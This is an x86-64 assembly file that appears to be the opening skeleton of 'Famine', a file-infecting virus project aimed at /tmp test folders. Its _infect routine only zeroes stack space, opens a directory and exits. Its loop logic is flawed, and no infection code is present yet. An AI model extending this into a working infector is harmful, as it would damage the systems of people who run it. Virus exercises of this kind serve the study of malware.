%define FOLDER_1 "/tmp/test"
%define FOLDER_2 "/tmp/test2"

%define FILE_SIZE 4
%define LINUX_DIRENT 128

%define SYS_OPEN 2
%define SYS_EXIT 60
%define SYS_GETDENTS64 217

%define SIGNATURE "Famine version 1.0 (c)oded by dbaffier"
[BITS 64]

section .text
    global _infect

_infect:
    ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
    mov rcx, FILE_SIZE + LINUX_DIRENT
    ;[rsp] filename
    ;[rsp + 32] linux_dirent

loop_bss:
    xor rax, rax
    push rax                                ; 8 bytes on stack
    dec rcx
    cmp rcx, 0
    jle loop_bss
    ; RSP contains fake BSS
    mov rbp, rsp ; Maybe
    call open_dir
    db FOLDER_1, 0

open_dir:
    pop rdi
    mov rsi, 0                              ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                              ; Quit if cannot OPEN
    jle quit    

quit:
    mov rax, SYS_EXIT
    mov rdi, 0
    syscall
